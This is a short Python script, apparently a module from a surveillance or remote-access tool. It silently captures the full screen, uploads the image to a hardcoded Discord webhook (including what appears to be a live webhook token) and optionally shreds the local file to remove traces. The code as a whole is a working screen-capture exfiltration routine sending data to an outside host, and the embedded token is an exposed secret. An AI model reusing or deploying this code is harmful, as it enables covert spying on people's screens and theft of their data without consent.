import pyautogui
from discord_webhook import DiscordWebhook, DiscordEmbed
import srm

#configs
def screenshot(srm_opt):
    hook = 'https://discordapp.com/api/webhooks/745098847881265303/QJRM5MbF7fHAuidNelyK4HsJUveTDhusqqt8OjvKMyFxjw17kJoq7x9VLzvSBHdGNzLz'

    #take screenshot and save to running directory

    screenshot = pyautogui.screenshot()
    screenshot.save("screen.png")

    #upload screenshot to discord webhook

    webhook = DiscordWebhook(url=hook)

    with open("screen.png", "rb") as f:
        webhook.add_file(file=f.read(), filename='screen.png')

    response = webhook.execute()

    f.close()

#option to remove file

    if srm_opt == True:
        srm.srm('screen.png')
